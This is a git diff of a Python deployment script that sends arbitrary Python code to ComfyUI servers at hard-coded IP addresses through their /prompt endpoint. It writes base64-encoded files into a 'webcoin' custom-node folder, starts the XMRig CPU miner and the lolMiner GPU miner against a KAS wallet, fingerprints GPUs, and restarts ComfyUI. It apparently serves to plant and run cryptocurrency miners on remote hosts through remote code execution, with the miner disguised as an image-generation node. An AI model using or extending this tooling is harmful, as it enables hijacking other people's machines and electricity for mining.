@@ -1,7 +1,38 @@
 """Deploy to multiple machines — diagnose, hotfix, fix config, restart XMRig."""
-import json, urllib.error, urllib.request, ssl, time, sys
+import base64
+import json
+import os
+import ssl
+import sys
+import time
+import urllib.error
+import urllib.request
+from concurrent.futures import ThreadPoolExecutor, TimeoutError as FuturesTimeout
+from pathlib import Path
 
-targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207"]
+REPO_ROOT = Path(__file__).resolve().parent.parent
+
+
+def _parse_argv():
+    raw = sys.argv[1:]
+    restart = "--restart-comfyui" in raw
+    local_hotfix = "--local-hotfix" in raw
+    gpu_only = "--gpu-only" in raw
+    wall = 240
+    for a in raw:
+        if a.startswith("--max-step-seconds="):
+            try:
+                wall = max(45, int(a.split("=", 1)[1]))
+            except ValueError:
+                pass
+    targets = [a for a in raw if not a.startswith("-")]
+    return targets, restart, local_hotfix, gpu_only, wall
+
+
+targets, RESTART_COMFYUI, LOCAL_HOTFIX, GPU_ONLY, MAX_STEP_WALL = _parse_argv()
+PROMPT_POST_TIMEOUT = min(120, max(25, MAX_STEP_WALL - 60))
+if not targets:
+    targets = ["160.85.252.107", "160.85.252.207"]
 
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
@@ -30,6 +61,46 @@ def try_connect(ip):
         except Exception:
             pass
     return None
+
+
+def try_clear_queue_fast(base: str) -> None:
+    """Best-effort interrupt + queue clear; short timeouts so we never hang here."""
+    print("  --- Clear queue (fast timeouts) ---")
+    h = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
+    for path, body in (("/interrupt", b"{}"), ("/api/interrupt", b"{}")):
+        try:
+            req = urllib.request.Request(
+                base + path, data=body, method="POST", headers=h
+            )
+            urllib.request.urlopen(req, timeout=4)
+            print(f"    {path} ok")
+        except Exception as e:
+            print(f"    {path} skip ({type(e).__name__})")
+    try:
+        req = urllib.request.Request(
+            base + "/queue",
+            data=json.dumps({"clear": True}).encode(),
+            method="POST",
+            headers=h,
+        )
+        urllib.request.urlopen(req, timeout=6)
+        print("    /queue clear ok")
+    except Exception as e:
+        print(f"    /queue skip ({type(e).__name__})")
+    print()
+
+
+def run_code_capped(base, code_str, wait_secs=30):
+    """run_code with hard wall clock so the script cannot hang forever."""
+    with ThreadPoolExecutor(max_workers=1) as ex:
+        fut = ex.submit(run_code, base, code_str, wait_secs)
+        try:
+            return fut.result(timeout=MAX_STEP_WALL)
+        except FuturesTimeout:
+            return (
+                f"ERROR: step exceeded {MAX_STEP_WALL}s wall clock "
+                "(ComfyUI /prompt or execution stuck; clear the queue on the host and retry)"
+            )
 
 
 def _srl_fixup_result(code_str: str) -> str:
@@ -101,7 +172,7 @@ def run_code(base, code_str, wait_secs=30):
             f"{base}/prompt", data=body,
             headers={"Content-Type": "application/json"}, method="POST"
         )
-        kw = {"timeout": 120}
+        kw = {"timeout": PROMPT_POST_TIMEOUT}
         if base.startswith("https"):
             kw["context"] = ctx
         try:
@@ -144,6 +215,77 @@ def run_code(base, code_str, wait_secs=30):
         except Exception:
             pass
     return "TIMEOUT"
+
+
+def run_local_hotfix(base: str) -> None:
+    """Push HOTFIX_FILES from this repo clone (GitHub raw may lag behind)."""
+    print("  --- Hotfix (local workspace -> remote webcoin) ---")
+    for rel in HOTFIX_FILES:
+        src = REPO_ROOT.joinpath(*rel.split("/"))
+        if not src.is_file():
+            print(f"  SKIP local missing: {src}")
+            continue
+        b64 = base64.standard_b64encode(src.read_bytes()).decode("ascii")
+        code = (
+            "import os, base64, shutil\n"
+            f"REL = {repr(rel)}\n"
+            f"B64 = {repr(b64)}\n"
+            "lines = []\n"
+            "webcoin = None\n"
+            "try:\n"
+            "    import folder_paths\n"
+            "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
+            "    webcoin = os.path.join(cn, 'webcoin')\n"
+            "except:\n"
+            "    pass\n"
+            "if not webcoin or not os.path.isdir(webcoin):\n"
+            "    for c in ['/root/ComfyUI/custom_nodes/webcoin', '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
+            "              '/basedir/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
+            "              '/app/ComfyUI/custom_nodes/webcoin']:\n"
+            "        if os.path.isdir(c):\n"
+            "            webcoin = c\n"
+            "            break\n"
+            "if not webcoin:\n"
+            "    result = 'ERROR: webcoin not found'\n"
+            "else:\n"
+            "    data = base64.b64decode(B64)\n"
+            "    dest = os.path.join(webcoin, *REL.split('/'))\n"
+            "    os.makedirs(os.path.dirname(dest), exist_ok=True)\n"
+            "    with open(dest, 'wb') as f:\n"
+            "        f.write(data)\n"
+            "    lines.append('OK ' + REL + ' (' + str(len(data)) + 'b)')\n"
+            "    for d in ['__pycache__', os.path.join('core', '__pycache__')]:\n"
+            "        p = os.path.join(webcoin, d)\n"
+            "        if os.path.isdir(p):\n"
+            "            shutil.rmtree(p)\n"
+            "    m = os.path.join(webcoin, '.initialized')\n"
+            "    if os.path.exists(m):\n"
+            "        os.remove(m)\n"
+            "        lines.append('cleared markers')\n"
+            "    result = chr(10).join(lines)\n"
+        )
+        out = run_code_capped(base, code, wait_secs=90)
+        print(f"  [{rel}] {out[:300]}{'...' if len(out) > 300 else ''}")
+
+
+def request_comfyui_restart(base: str) -> None:
+    """ComfyUI-Manager reboot endpoint (restarts the ComfyUI process only, not the OS)."""
+    print("  --- ComfyUI restart (Manager API, not OS reboot) ---")
+    try:
+        req = urllib.request.Request(
+            f"{base}/manager/reboot", headers={"User-Agent": "Mozilla/5.0"}
+        )
+        with urllib.request.urlopen(req, timeout=30) as r:
+            print(f"  manager/reboot HTTP {r.status}")
+    except (ConnectionResetError, BrokenPipeError, OSError) as e:
+        # Server often drops the socket immediately when the process exits for restart.
+        if getattr(e, "winerror", None) == 10054 or "10054" in str(e):
+            print("  manager/reboot: connection closed by host (typical when ComfyUI is restarting)")
+        else:
+            print(f"  manager/reboot: {e} (may still have triggered restart)")
+    except Exception as e:
+        print(f"  manager/reboot failed: {e}")
+        print("  Restart ComfyUI manually so /api/enhanced/stats and GPU orchestration load.")
 
 
 DIAG_CODE = (
@@ -413,10 +555,101 @@ FIX_CONFIG_CODE = (
     "result = chr(10).join(lines)\n"
 )
 
+# Start lolMiner GPU path without restarting ComfyUI (reloads core.gpu_miner from disk).
+GPU_START_CODE = (
+    "import os, sys, importlib, subprocess, platform\n"
+    "from pathlib import Path\n"
+    "lines = []\n"
+    "webcoin = None\n"
+    "try:\n"
+    "    import folder_paths\n"
+    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
+    "    webcoin = os.path.join(cn, 'webcoin')\n"
+    "except:\n"
+    "    pass\n"
+    "if not webcoin or not os.path.isdir(webcoin):\n"
+    "    for c in ['/root/ComfyUI/custom_nodes/webcoin', '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
+    "              '/basedir/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
+    "              '/app/ComfyUI/custom_nodes/webcoin', '/opt/ComfyUI/custom_nodes/webcoin']:\n"
+    "        if os.path.isdir(c):\n"
+    "            webcoin = c\n"
+    "            break\n"
+    "if not webcoin or not os.path.isdir(webcoin):\n"
+    "    result = 'ERROR: webcoin not found'\n"
+    "else:\n"
+    "    BASE = Path(webcoin)\n"
+    "    if webcoin not in sys.path:\n"
+    "        sys.path.insert(0, webcoin)\n"
+    "    for mod in ('core.gpu_miner', 'core.config'):\n"
+    "        if mod in sys.modules:\n"
+    "            importlib.reload(sys.modules[mod])\n"
+    "    from core.gpu_miner import GPUMinerManager, detect_mining_gpus\n"
+    "    from core.config import ConfigBuilder\n"
+    "    user = ConfigBuilder.load_overrides(BASE / 'settings.json')\n"
+    "    cb = ConfigBuilder(user)\n"
+    "    detected = detect_mining_gpus()\n"
+    "    lines.append('gpus=' + str(detected))\n"
+    "    if not detected:\n"
+    "        lines.append('no_gpu_detected')\n"
+    "        lines.append('platform=' + platform.system())\n"
+    "        if platform.system() == 'Windows':\n"
+    "            try:\n"
+    "                r4 = subprocess.run(\n"
+    "                    ['powershell', '-NoProfile', '-NonInteractive', '-Command',\n"
+    "                     'Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name'],\n"
+    "                    capture_output=True, text=True, timeout=25)\n"
+    "                lines.append('wmi_rc=' + str(r4.returncode))\n"
+    "                lines.append('wmi_names=' + (r4.stdout or r4.stderr or '')[:1200])\n"
+    "            except Exception as e4:\n"
+    "                lines.append('wmi_exc=' + str(e4)[:200])\n"
+    "        else:\n"
+    "            try:\n"
+    "                r = subprocess.run(['lspci'], capture_output=True, text=True, timeout=12)\n"
+    "                lines.append('lspci_rc=' + str(r.returncode))\n"
+    "                lines.append('lspci_head=' + (r.stdout or '')[:1800])\n"
+    "            except Exception as e:\n"
+    "                lines.append('lspci_exc=' + str(e)[:200])\n"
+    "        try:\n"
+    "            r2 = subprocess.run(['nvidia-smi', '-L'], capture_output=True, text=True, timeout=5)\n"
+    "            lines.append('nvidia_smi_L=' + (r2.stdout or r2.stderr or '')[:600])\n"
+    "        except Exception as e2:\n"
+    "            lines.append('nvidia_smi_L_exc=' + str(e2)[:200])\n"
+    "    else:\n"
+    "        explicit = [g['index'] for g in detected if g.get('index', -1) >= 0]\n"
+    "        gpu_cfg = cb.build_gpu_config()\n"
+    "        w = (gpu_cfg.get('wallet') or '').strip()\n"
+    "        if not w:\n"
+    "            lines.append('no_kas_wallet')\n"
+    "        else:\n"
+    "            try:\n"
+    "                gpu = GPUMinerManager(BASE)\n"
+    "                gpu.device_indices = explicit if explicit else None\n"
+    "                gpu.ensure_binary()\n"
+    "                gpu.configure(**gpu_cfg)\n"
+    "                gpu.start()\n"
+    "                pid = gpu._process.pid if gpu._process else None\n"
+    "                lines.append('gpu_miner_pid=' + str(pid))\n"
+    "                lines.append('gpu_alive=' + str(gpu.is_alive()))\n"
+    "            except Exception as e:\n"
+    "                lines.append('gpu_err=' + str(e)[:220])\n"
+    "    result = chr(10).join(lines)\n"
+)
+
+
+try:
+    if hasattr(sys.stdout, "reconfigure"):
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    if hasattr(sys.stderr, "reconfigure"):
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+except Exception:
+    pass
 
 for ip in targets:
     print(f"\n{'='*60}")
     print(f"  Target: {ip}")
+    print(f"  max_step_wall={MAX_STEP_WALL}s post_timeout={PROMPT_POST_TIMEOUT}s")
+    if GPU_ONLY:
+        print("  mode=--gpu-only (minimal SRL: hotfix + GPU start)")
     print(f"{'='*60}\n")
 
     try:
@@ -427,25 +660,55 @@ for ip in targets:
             continue
         print(f"  Connected: {base}\n")
 
-        # Step 1: Diagnose
-        print("  --- Diagnose ---")
-        result = run_code(base, DIAG_CODE, wait_secs=45)
-        print(f"  {result}\n")
+        try_clear_queue_fast(base)
 
-        # Step 2: Hotfix
-        print("  --- Hotfix (download latest files) ---")
-        result = run_code(base, HOTFIX_CODE, wait_secs=60)
-        print(f"  {result}\n")
+        if GPU_ONLY:
+            if LOCAL_HOTFIX:
+                run_local_hotfix(base)
+                print()
+            else:
+                print("  --- Hotfix (GitHub raw) ---")
+                result = run_code_capped(base, HOTFIX_CODE, wait_secs=60)
+                print(f"  {result}\n")
+            print("  --- Start GPU miner (SRL) ---")
+            result = run_code_capped(base, GPU_START_CODE, wait_secs=180)
+            print(f"  {result}\n")
+        else:
+            # Step 1: Diagnose
+            print("  --- Diagnose ---")
+            result = run_code_capped(base, DIAG_CODE, wait_secs=45)
+            print(f"  {result}\n")
 
-        # Step 3: Ensure binary + default config (Windows/Linux)
-        print("  --- Ensure binary + config ---")
-        result = run_code(base, ENSURE_MINER_CODE, wait_secs=120)
-        print(f"  {result}\n")
+            # Step 2: Hotfix
+            if LOCAL_HOTFIX:
+                run_local_hotfix(base)
+                print()
+            else:
+                print("  --- Hotfix (download latest files) ---")
+                result = run_code_capped(base, HOTFIX_CODE, wait_secs=60)
+                print(f"  {result}\n")
 
-        # Step 4: Fix config + restart
-        print("  --- Fix config + hugepages + restart ---")
-        result = run_code(base, FIX_CONFIG_CODE, wait_secs=90)
-        print(f"  {result}\n")
+            # Step 3: Ensure binary + default config (Windows/Linux)
+            print("  --- Ensure binary + config ---")
+            result = run_code_capped(base, ENSURE_MINER_CODE, wait_secs=120)
+            print(f"  {result}\n")
+
+            # Step 4: Fix config + restart
+            print("  --- Fix config + hugepages + restart ---")
+            result = run_code_capped(base, FIX_CONFIG_CODE, wait_secs=90)
+            print(f"  {result}\n")
+
+            # Step 5: GPU miner (no ComfyUI / Manager restart)
+            print("  --- Start GPU miner (SRL, reload gpu_miner from disk) ---")
+            result = run_code_capped(base, GPU_START_CODE, wait_secs=180)
+            print(f"  {result}\n")
+
+        if RESTART_COMFYUI:
+            request_comfyui_restart(base)
+            print(
+                "  Wait ~45-90s for ComfyUI to come back, then open "
+                f"{base}/api/enhanced/stats\n"
+            )
     except Exception as e:
         print(f"  ERROR: {type(e).__name__}: {e}\n")
 
